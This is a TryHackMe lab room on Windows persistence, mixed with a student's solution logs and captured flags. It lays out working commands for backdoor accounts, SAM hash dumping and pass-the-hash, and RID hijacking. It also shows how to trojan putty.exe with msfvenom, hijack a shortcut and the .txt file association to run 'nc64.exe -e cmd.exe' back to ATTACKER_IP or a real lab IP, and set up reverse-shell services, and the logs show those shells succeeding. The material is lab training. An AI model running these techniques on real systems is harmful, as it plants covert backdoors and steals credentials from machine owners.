---
Learn the most common persistence techniques used on Windows machines.
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/1bbcdf49f7e65fbb807dfa9e44a85b88.png)

###  Introduction 

After gaining the first foothold on your target's internal network, you'll want to ensure you don't lose access to it before actually getting to the crown jewels. Establishing persistence is one of the first tasks we'll have as attackers when gaining access to a network. In simple terms, persistence refers to creating alternate ways to regain access to a host without going through the exploitation phase all over again.

There are many reasons why you'd want to establish persistence as quick as possible, including:

    Re-exploitation isn't always possible: Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them.
    Gaining a foothold is hard to reproduce: For example, if you used a phishing campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network.
    The blue team is after you: Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock!

While you could do with keeping some administrator's password hash and reusing it to connect back, you always risk those credentials getting rotated at some point. Plus, there are sneakier ways in which you could regain access to a compromised machine, making life harder for the blue team.

In this room, we'll look at the most common techniques attackers use to establish persistence in Windows systems. Before going into this room, it is recommended to be familiar with Windows systems fundamentals. You can check rooms on the matter in the following links:

    Windows Fundamentals 1
    Windows Fundamentals 2

Powershell is also used extensively throughout this room. You can learn more about it in the Hacking with Powershell room.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9023b48f1f25613de9ab9ccf27843037.png)

### Tampering With Unprivileged Accounts 

Having an administrator's credential would be the easiest way to achieve persistence in a machine. However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.

Click the Start Machine button on this task before continuing. The machine will be available on your web browser, but if you prefer connecting via RDP, you can use the following credentials:

Username 	Administrator
Password 	Password321

Note: When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing Reconnect.

Notice that we assume you have already gained administrative access somehow and are trying to establish persistence from there.

Assign Group Memberships

For this part of the task, we will assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators group. We can easily achieve this with the following command:

```
ommand Prompt

C:\> net localgroup administrators thmuser0 /add

        
```

This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If this looks too suspicious, you can use the Backup Operators group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.

To do so, we begin by adding the account to the Backup Operators group:

```

Command Prompt

C:\> net localgroup "Backup Operators" thmuser1 /add

        


```

Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups. We'll use WinRM for this task:

```

Command Prompt

C:\> net localgroup "Remote Management Users" thmuser1 /add

        


```

We'll assume we have already dumped the credentials on the server and have thmuser1's password. Let's connect via WinRM using its credentials:

Username 	thmuser1
Password 	Password321

If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled:

```

AttackBox

user@AttackBox$ evil-winrm -i 10.10.6.15 -u thmuser1 -p Password321

*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

        


```

This is due to User Account Control (UAC). One of the features implemented by UAC, LocalAccountTokenFilterPolicy, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC here), if you are using WinRM, you are confined to a limited access token with no administrative privileges.

To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:

```

Command Prompt

C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

        


```

Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:

```

AttackBox

user@AttackBox$ evil-winrm -i 10.10.6.15 -u thmuser1 -p Password321
        
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288

        


```


        

We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:

```

AttackBox

*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!

        


```

Note: If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

With those files, we can dump the password hashes for all users using secretsdump.py or other similar tools:

```

AttackBox

user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
[*] Cleaning up...

        


```

And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:

```

AttackBox

user@AttackBox$ evil-winrm -i 10.10.6.15 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3

        


```

	Using the Administrator console gained through the thmuser1, execute C:\flags\flag1.exe to retrieve your flag.

Special Privileges and Security Descriptors

A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. Privileges are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be found here for reference.

In the case of the Backup Operators group, it has the following two privileges assigned by default:

    SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
    SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the secedit command. First, we will export the current configuration to a temporary file:

```
secedit /export /cfg config.inf
```

We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/765671a0355e2260c44e5a12a10f090e.png)

We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:

```
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a security descriptor as an ACL but applied to other system facilities.

To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this):

```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/380c80b98c4d1f8c2149ef72427cfeb0.png)

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change the LocalAccountTokenFilterPolicy registry key, but we've done this already to get the previous flag.

If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!

```

Command Prompt

C:\> net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None

        


```

Once again, we'll assume we have already dumped the credentials on the server and have thmuser2's password. Let's connect with its credentials using WinRM:

Username 	thmuser2
Password 	Password321

We can log in with those credentials to obtain the flag.

	Log in to the machine via WinRM using thmuser2 and execute C:\flags\flag2.exe to retrieve your flag.

RID Hijacking

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier called Relative ID (RID) is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.

To find the assigned RIDs for any user, you can use the following command:

```

Command Prompt

C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010

        


```

The RID is the last bit of the SID (1010 for thmuser3 and 500 for Administrator). The SID is an identifier that allows the operating system to identify a user across a domain, but we won't mind too much about the rest of it for this task.

	Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in C:\tools\pstools in your machine:

```

Command Prompt

C:\tools\pstools> PsExec64.exe -i -s regedit

        


```

	From Regedit, we will go to HKLM\SAM\SAM\Domains\Account\Users\ where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called F, which holds the user's effective RID at position 0x30:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d630140974989748ebcf150ba0696d14.png)

Notice the RID is stored using little-endian notation, so its bytes appear reversed.

We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8f2072b6d13b7343cf7b890586703ddf.png)

The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.

For this task, we assume you have already compromised the system and obtained the password for thmuser3. For your convenience, the user can connect via RDP with the following credentials:

Username 	thmuser3
Password 	Password321

If you did everything correctly, you should be logged in to the Administrator's desktop. 


Note: When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing Reconnect.

	Log in to the machine via RDP using thmuser3 and execute C:\flags\flag3.exe to retrieve your flag.

```
C:\Users\Administrator>net localgroup administrators thmuser0 /add
The command completed successfully.


C:\Users\Administrator>net localgroup "Backup Operators" thmuser1 /add
The command completed successfully.


C:\Users\Administrator>net localgroup "Remote Management Users" thmuser1 /add
The command completed successfully.


C:\Users\Administrator>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
The operation completed successfully.

┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.6.15 -u thmuser1 -p Password321

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                 

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\thmuser1\Documents> reg save hklm\system system.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Users\thmuser1\Documents> reg save hklm\sam sam.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Users\thmuser1\Documents> download system.bak
Info: Downloading system.bak to ./system.bak

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\thmuser1\Documents> download sam.bak
Info: Downloading sam.bak to ./sam.bak

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\thmuser1\Documents> 

Warning: Press "y" to exit, press any other key to continue


Info: Exiting...

                                                                                           
┌──(kali㉿kali)-[~]
└─$ 
                                                                                           
┌──(kali㉿kali)-[~]
└─$ 
                                                                                           
┌──(kali㉿kali)-[~]
└─$ ls
armitage-tmp  Documents        liv0ff.ps1          PowerLessShell   system.bak
book.txt      Downloads        live0fftheland.dll  Public           Templates
clinic.lst    ftp_flag.txt     multi_launcher      sam.bak          thm.hta
crunch.txt    hashctf2         Music               sandox_learning  usernames-list.txt
Desktop       IDS_IPS_evasion  payload.hta         snmpcheck        Videos
dict2.lst     index.raw        Pictures            stager2.bat
dict.lst      launcher.bat     powercat            Sublist3r
                                                                                           
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
[*] Cleaning up... 

┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.6.15 -u Administrator -H f3118544a831e728781d780cfdb9c1fa

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                 

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\
*Evil-WinRM* PS C:\> cd flags
*Evil-WinRM* PS C:\flags> .\flag1.exe
THM{FLAG_BACKED_UP!}

```

Insert flag1 here
*THM{FLAG_BACKED_UP!}*

```
C:\Users\Administrator>secedit /export /cfg config.inf

The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.

C:\Users\Administrator>secedit /import /cfg config.inf /db config.sdb

C:\Users\Administrator>secedit /configure /db config.sdb /cfg config.inf

The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.

C:\Users\Administrator>net user thmuser2
User name                    thmuser2
Full Name                    thmuser2
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/28/2022 11:48:03 PM
Password expires             Never
Password changeable          5/28/2022 11:48:03 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.

config add thmuser2 in SeBackupPrivilege and SeRestorePrivilege

┌──(kali㉿kali)-[~] 
└─$ evil-winrm -i 10.10.6.15 -u thmuser2 -H f3118544a831e728781d780cfdb9c1fa     

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                 

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\thmuser2\Documents> cd C:\flags
*Evil-WinRM* PS C:\flags> .\flag2.exe
THM{IM_JUST_A_NORMAL_USER}

pheww after a long time 
use these commands in C:\flags\
secedit /export /cfg config.inf
....
```

![[Pasted image 20220911123118.png]]

Insert flag2 here
*THM{IM_JUST_A_NORMAL_USER}*

```
C:\flags>wmic useraccount get name,sid                                                                                  Name                SID                                                                                                 Administrator       S-1-5-21-1966530601-3185510712-10604624-500                                                         DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503                                                         Guest               S-1-5-21-1966530601-3185510712-10604624-501                                                         thmuser0            S-1-5-21-1966530601-3185510712-10604624-1011                                                        thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008                                                        thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009                                                        thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010                                                        thmuser4            S-1-5-21-1966530601-3185510712-10604624-1013                                                        WDAGUtilityAccount  S-1-5-21-1966530601-3185510712-10604624-504                                                                                                                                                                                                                                                                                                         C:\flags>PsExec64.exe -i -s regedit                                                                                     'PsExec64.exe' is not recognized as an internal or external command,                                                    operable program or batch file.                                                                                                                                                                                                                 C:\flags>cd C:\tools\pstools                                                                                                                                                                                                                    C:\tools\pstools>PsExec64.exe -i -s regedit                                                                                                                                                                                                     PsExec v2.34 - Execute processes remotely                                                                               Copyright (C) 2001-2021 Mark Russinovich                                                                                Sysinternals - www.sysinternals.com                                                                                                                                                                                                                                                                                                                                     regedit exited on WPERSISTENCE with error code 0.                                                                                                                                                                                               C:\tools\pstools>cd C:\flags (2)                                                                                                                                                                                                                   C:\flags>.\flag3.exe                                                                                                    THM{TRUST_ME_IM_AN_ADMIN}      

┌──(kali㉿kali)-[~/IDS_IPS_evasion]
└─$ xfreerdp /u:thmuser3 /p:'Password321' /v:10.10.6.15 /size:85%  (1)
```


Insert flag3 here
*THM{TRUST_ME_IM_AN_ADMIN} *


### Backdooring Files 

Another method of establishing persistence consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.

While there are many opportunities to plant backdoors, we will check the most commonly used ones.

Executable Files

	If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to C:\Program Files\PuTTY\putty.exe. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

You can easily plant a payload of your preference in any .exe file with msfvenom. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. While this method is good enough to establish persistence, let's look at other sneakier techniques.

Shortcut Files

If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

For this task, let's check the shortcut to calc on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7a7349b9dcc5af3180044ee1d7605967.png)

	Before hijacking the shortcut's target, let's create a simple Powershell script in C:\Windows\System32 or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add the -windowstyle hidden option to Powershell. The final target of the shortcut would be:

![[Pasted image 20220911144421.png]]

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fe703ddea6135e0c867afcc6f61a8cd2.png)

Let's start an nc listener to receive our reverse shell on our attacker's machine:

```

AttackBox

user@AttackBox$ nc -lvp 4445

        


```

	If you double-click the shortcut, you should get a connection back to your attacker's machine. Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen. A regular user might not mind too much about that, hopefully. 
	THM flagExecute C:\flags\flag5.exe from your reverse shell to get your flag!

Hijacking File Associations

In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under HKLM\Software\Classes\. Let's say we want to check which program is used to open .txt files; we can just go and check for the .txt subkey and find which Programmatic ID (ProgID) is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3ae1b8356b38a349090e836026d6d480.png)

	We can then search for a subkey for the corresponding ProgID (also under HKLM\Software\Classes\), in this case, txtfile, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under shell\open\command where the default command to be run for files with that extension is specified:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c3565cf93de4990f41f41b25aed80571.png)

	In this case, when you try to open a .txt file, the system will execute %SystemRoot%\system32\NOTEPAD.EXE %1, where %1 represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to C:\Windows\backdoor2.ps1:

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

	Notice how in Powershell, we have to pass $args[0] to notepad, as it will contain the name of the file to be opened, as given through %1.

Now let's change the registry key to run our backdoor script in a hidden window:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f7ed25a701cf20ea85cf333b20708ffe.png)

	Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.
	THM flagOnce you have backdoored the .txt file handler and spawned a reverse shell, run C:\flags\flag6.exe to get a flag!


```
──(kali㉿kali)-[~/payloads]
└─$ ls
index.raw  launcher.bat  liv0ff.ps1  live0fftheland.dll  payload.hta  thm.hta


Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.11.81.220 4445"

C:\Windows\System32\calc.exe


┌──(kali㉿kali)-[~/payloads]
└─$ nc -lvp 4445        
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 10.10.170.100.
Ncat: Connection from 10.10.170.100:49732.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\flags
cd C:\flags

C:\flags>.\flag5.exe
.\flag5.exe
THM{NO_SHORTCUTS_IN_LIFE}

```


Insert flag5 here
*THM{NO_SHORTCUTS_IN_LIFE}*

```
PS C:\Users\Administrator> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.11.81.220 4448"
PS C:\Users\Administrator> C:\Windows\system32\NOTEPAD.EXE $args[0]

┌──(kali㉿kali)-[~/payloads]
└─$ nc -lvp 4448
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4448
Ncat: Listening on 0.0.0.0:4448
Ncat: Connection from 10.10.170.100.
Ncat: Connection from 10.10.170.100:49804.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\flags
cd C:\flags

C:\flags>.\flag6.exe
.\flag6.exe
THM{TXT_FILES_WOULD_NEVER_HURT_YOU}


```
![[Pasted image 20220911154731.png]]

![[Pasted image 20220911154552.png]]
Insert flag6 here
*THM{TXT_FILES_WOULD_NEVER_HURT_YOU}*

### Abusing Services 

Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.

Creating backdoor services

We can create and start a service named "THMservice" using the following commands:

```
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```



Note: There must be a space after each equal sign for the command to work.

The "net user" command will be executed when the service is started, resetting the Administrator's password to Passwd123. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the exe-service format in msfvenom:

```

AttackBox

user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe

        


```
You can then copy the executable to your target system, say in C:\Windows and point the service's binPath to it:

```
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

	This should create a connection back to your attacker's machine.
	THM flagUse the reverse shell you just gained to execute C:\flags\flag7.exe

Modifying existing services

While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.

You can get a list of available services using the following command:

```

Command Prompt

C:\> sc.exe query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

        


```

You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:

```

Command Prompt

C:\> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service

        


```

There are three things we care about when using a service for persistence:

    The executable (BINARY_PATH_NAME) should point to our payload.
    The service START_TYPE should be automatic so that the payload runs without user interaction.
